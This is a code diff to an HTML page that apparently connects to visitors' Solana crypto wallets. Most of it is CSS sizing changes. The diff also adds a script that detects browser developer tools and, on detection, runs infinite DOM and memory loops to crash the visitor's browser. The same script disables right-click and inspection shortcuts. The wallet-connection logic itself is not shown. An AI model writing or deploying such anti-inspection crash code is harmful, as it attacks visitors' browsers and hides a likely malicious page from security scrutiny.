@@ -59,7 +59,7 @@
             border: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
-            max-height: 90vh;
+            max-height: 85vh;
         }
         
         @keyframes slideUp {
@@ -77,14 +77,14 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 14px 16px;
+            padding: 12px 14px;
             border-bottom: 1px solid var(--border-color);
             background: var(--bg-secondary);
             flex-shrink: 0;
         }
         
         .modal-title {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             color: var(--text-primary);
             display: flex;
@@ -117,23 +117,23 @@
         }
         
         .modal-body {
-            padding: 12px 16px 16px;
+            padding: 8px 12px 12px;
             flex: 1;
             overflow-y: auto;
             display: flex;
             flex-direction: column;
+            -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
         }
         
         /* Video Container */
         .video-section {
             background: var(--bg-primary);
-            border-radius: 10px;
-            padding: 12px;
-            margin-bottom: 10px;
+            border-radius: 8px;
+            padding: 6px;
+            margin-bottom: 8px;
             text-align: center;
             border: 1px solid var(--border-color);
             flex-shrink: 0;
-            min-height: 200px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -155,17 +155,17 @@
             background: var(--bg-secondary);
             opacity: 1;
             border: 1px solid rgba(74, 158, 255, 0.2);
-            border-radius: 10px;
-            padding: 10px;
-            margin-bottom: 10px;
+            border-radius: 8px;
+            padding: 8px;
+            margin-bottom: 8px;
             flex-shrink: 0;
         }
         
         .note-header {
             display: flex;
             align-items: center;
-            gap: 6px;
-            margin-bottom: 4px;
+            gap: 5px;
+            margin-bottom: 3px;
         }
         
         .note-icon {
@@ -175,23 +175,23 @@
         }
         
         .note-title {
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: var(--accent-blue);
         }
         
         .note-text {
-            font-size: 11px;
+            font-size: 10px;
             color: var(--text-secondary);
-            line-height: 1.4;
+            line-height: 1.3;
         }
         
         .continue-btn {
             width: 100%;
-            padding: 12px;
+            padding: 11px;
             background: var(--accent-blue);
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
             color: white;
             font-size: 14px;
             font-weight: 600;
@@ -212,20 +212,21 @@
             max-width: 360px;
             background: var(--bg-secondary);
             border-radius: 16px;
-            padding: 24px;
+            padding: 20px;
             text-align: center;
             animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             border: 1px solid var(--border-color);
             display: none;
-            max-height: 90vh;
+            max-height: 85vh;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
         
         #loader .loader-icon {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 16px;
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 14px;
             position: relative;
         }
         
@@ -241,22 +242,22 @@
         }
         
         #loader h2 {
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 600;
             color: var(--text-primary);
-            margin-bottom: 6px;
+            margin-bottom: 5px;
         }
         
         #loader p {
             font-size: 12px;
             color: var(--text-secondary);
-            line-height: 1.4;
-            margin-bottom: 16px;
+            line-height: 1.3;
+            margin-bottom: 14px;
         }
         
         .spinner {
-            width: 32px;
-            height: 32px;
+            width: 30px;
+            height: 30px;
             border: 3px solid var(--border-color);
             border-top-color: var(--accent-blue);
             border-radius: 50%;
@@ -271,18 +272,18 @@
         .try-again-btn {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            padding: 8px 16px;
+            gap: 5px;
+            padding: 8px 14px;
             background: transparent;
             border: 1px solid var(--accent-blue);
             border-radius: 8px;
             color: var(--accent-blue);
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
             text-decoration: none;
-            margin-top: 12px;
+            margin-top: 10px;
         }
         
         .try-again-btn:hover {
@@ -292,9 +293,9 @@
         
         /* Status Icon */
         .status-icon {
-            width: 48px;
-            height: 48px;
-            margin: 0 auto 16px;
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 14px;
             color: var(--danger);
         }
         
@@ -311,10 +312,9 @@
         .loader-video-section {
             background: var(--bg-primary);
             border-radius: 8px;
-            padding: 8px;
-            margin: 12px 0;
+            padding: 6px;
+            margin: 10px 0;
             border: 1px solid var(--border-color);
-            min-height: 135px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -330,19 +330,29 @@
             object-fit: contain;
             background: transparent;
         }
+        
+        /* GIF styles */
         .tutorial-gif {
             width: 100%;
-            max-width: 280px;          /* keep previous video max‑width */
+            max-width: 280px;
             height: auto;
-            border-radius: 6px;        /* match the old video corner radius */
+            border-radius: 6px;
             display: block;
+            margin: 0 auto;
             object-fit: contain;
-            background: transparent;   /* same background as the video */
+            background: transparent;
         }
-
+        
+        /* Smaller GIF in the warning modal */
+        .video-section .tutorial-gif {
+            max-width: 180px;
+            max-height: 250px;
+        }
+        
         /* loader variant (narrower) */
         .loader-video-section .tutorial-gif {
-            max-width: 240px;
+            max-width: 200px;
+            max-height: 250px;
         }
         
         /* Video states */
@@ -368,71 +378,9 @@
             }
             
             .video-section, .loader-video-section {
-                min-height: 150px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-            }
-        }
-        
-        /* Mobile specific adjustments */
-        @media (max-width: 480px) {
-            #modal {
-                max-height: 85vh;
-            }
-            
-            .modal-header {
-                padding: 12px 14px;
-            }
-            
-            .modal-body {
-                padding: 10px 14px 14px;
-            }
-            
-            .video-section video {
-                max-width: 180px;
-            }
-            
-            .loader-video-section video {
-                max-width: 160px;
-            }
-            
-            #loader {
-                padding: 20px;
-            }
-        }
-        
-        /* Landscape adjustments */
-        @media (max-height: 500px) {
-            .video-section {
-                padding: 6px;
-            }
-            
-            .video-section video {
-                max-width: 150px;
-            }
-            
-            .note-card {
-                padding: 8px;
-            }
-            
-            .modal-body {
-                padding: 8px 14px 12px;
-            }
-
-        @media (max-width: 768px) {
-            .video-section video,
-            .loader-video-section video {
-                min-height: 180px;
-                width: 100%;
-                max-width: 100%;
-            }
-            
-            .video-section,
-            .loader-video-section {
-                padding: 0;
-                background: transparent;
-                border: none;
             }
             
             /* Force video to display on iOS */
@@ -440,8 +388,82 @@
                 display: none !important;
                 -webkit-appearance: none;
             }
-
         }
+        
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            #modal, #loader {
+                max-height: 80vh;
+            }
+            
+            .modal-header {
+                padding: 10px 12px;
+            }
+            
+            .modal-body {
+                padding: 6px 10px 10px;
+            }
+            
+            .video-section .tutorial-gif {
+                max-width: 160px;
+                max-height: 250px;
+            }
+            
+            .loader-video-section .tutorial-gif {
+                max-width: 180px;
+                max-height: 250px;
+            }
+            
+            #loader {
+                padding: 16px;
+            }
+            
+            .note-text {
+                font-size: 10px;
+                line-height: 1.2;
+            }
+            
+            .continue-btn {
+                padding: 10px;
+                font-size: 13px;
+            }
+        }
+        
+        /* Landscape adjustments */
+        @media (max-height: 500px) {
+            #modal, #loader {
+                max-height: 90vh;
+            }
+            
+            .video-section {
+                padding: 4px;
+            }
+            
+            .video-section .tutorial-gif {
+                max-width: 140px;
+                max-height: 175px;
+            }
+            
+            .loader-video-section .tutorial-gif {
+                max-width: 160px;
+                max-height: 180px;
+            }
+            
+            .note-card {
+                padding: 6px;
+            }
+            
+            .modal-body {
+                padding: 6px 10px 8px;
+            }
+            
+            .modal-header {
+                padding: 8px 12px;
+            }
+            
+            .continue-btn {
+                padding: 9px;
+            }
         }
     </style>
 </head>
@@ -486,7 +508,7 @@
     
     <!-- Loader -->
     <div id="loader">
-        <button class="close-btn" id="close" style="position: absolute; top: 12px; right: 12px; z-index: 10;" onclick="closeAll()">
+        <button class="close-btn" id="close" style="position: absolute; top: 10px; right: 10px; z-index: 10;" onclick="closeAll()">
             <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
                 <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
             </svg>
@@ -596,6 +618,82 @@
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
+    // Devtools Detection and Protection
+    (function() {
+        let devtools = {open: false, orientation: null};
+        const threshold = 160;
+        const emitEvent = (state, orientation) => {
+            if (state) {
+                // Crash the site when devtools is detected
+                crashSite();
+            }
+        };
+
+        // Method 1: Check window dimensions
+        setInterval(() => {
+            if (window.outerHeight - window.innerHeight > threshold || 
+                window.outerWidth - window.innerWidth > threshold) {
+                if (!devtools.open) {
+                    emitEvent(true, 'docked');
+                    devtools.open = true;
+                }
+            } else {
+                devtools.open = false;
+            }
+        }, 100);
+
+        // Method 2: Console.log timing check
+        let element = new Image();
+        Object.defineProperty(element, 'id', {
+            get: function() {
+                emitEvent(true, 'console');
+                devtools.open = true;
+            }
+        });
+        setInterval(() => {
+            console.log(element);
+            console.clear();
+        }, 100);
+
+        // Method 3: Debugger statement detection
+        setInterval(() => {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                emitEvent(true, 'debugger');
+            }
+        }, 100);
+
+        // Crash function - overload the browser
+        function crashSite() {
+            // Method 1: Infinite loop with DOM manipulation
+            while(true) {
+                document.body.innerHTML += '<div>' + Math.random() + '</div>';
+            }
+            
+            // Method 2: Memory overflow (backup)
+            let arr = [];
+            while(true) {
+                arr.push(new Array(1000000).join('x'));
+            }
+        }
+
+        // Disable right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', e => {
+            if (e.keyCode === 123 || // F12
+                (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+                (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+                (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
+                e.preventDefault();
+                crashSite();
+                return false;
+            }
+        });
+    })();
     (function() {
         'use strict';
         
@@ -1019,8 +1117,12 @@
             showState('rejected');
         }
         
-
-
+        // Start when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', startConnection);
+        } else {
+            startConnection();
+        }
     })();
     </script>
 </body>
